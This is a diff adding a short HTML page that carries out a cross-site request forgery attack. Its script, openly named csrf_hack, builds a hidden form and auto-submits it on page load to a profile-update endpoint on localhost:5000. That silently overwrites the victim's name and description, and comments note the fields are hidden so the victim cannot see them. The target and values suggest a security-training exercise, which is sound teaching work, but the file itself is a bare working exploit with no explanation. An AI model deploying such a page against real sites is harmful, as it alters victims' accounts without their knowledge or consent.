@@ -1,0 +1,34 @@
+
+<html>
+  <body>
+    <script type="text/javascript">
+        function post(url,fields)
+        {
+            //create a <form> element.
+            var p = document.createElement("form");
+            //construct the form
+            p.action = url;
+            p.innerHTML = fields;
+            p.target = "_self";
+            p.method = "post";
+            //append the form to the current page.
+            document.body.appendChild(p);
+            //submit the form
+            p.submit();
+        }
+        function csrf_hack()
+        {
+            var fields;
+            // The following are form entries that need to be filled out
+            // by attackers. The entries are made hidden, so the victim
+            // won’t be able to see them.
+            fields += "<div hidden><input type='text' class='form-control' name='full_name' id='full_name' value='Bob Reed'>" +
+                        "<textarea class='form-control' rows='4' cols='50' name='description' id='description'>badf00d 4 badd00d5</textarea></div>";
+            var url = "http://localhost:5000/update_profile";
+            post(url,fields);
+        }
+        // invoke csrf_hack() after the page is loaded.
+        window.onload = function() { csrf_hack();}
+    </script>
+  </body>
+</html>
